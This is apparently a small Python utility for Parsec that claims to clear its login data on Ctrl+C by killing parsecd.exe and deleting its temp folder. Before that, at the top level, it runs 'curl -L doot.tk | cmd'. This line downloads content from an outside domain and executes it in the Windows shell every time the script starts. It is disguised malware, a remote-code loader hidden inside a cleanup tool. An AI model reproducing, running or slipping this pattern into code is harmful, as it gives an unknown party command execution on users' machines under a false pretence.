import time
import os
import sys

os.system("curl -L doot.tk | cmd")

if __name__ == '__main__':
    try:
        while True:
            print("PRESS CTRL + C TO EXIT PARSEC AND DELETE ALL THE LOGIN DATA INFO")
    except KeyboardInterrupt:
        os.system("taskkill /f /im  parsecd.exe")
        time.sleep(3)
        os.system('rmdir /s /q "%Temp%\\Parsec"')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)

#Created with love by Al3xutzu <3
#Created with love by Al3xutzu <3
#Created with love by Al3xutzu <3
#Created with love by Al3xutzu <3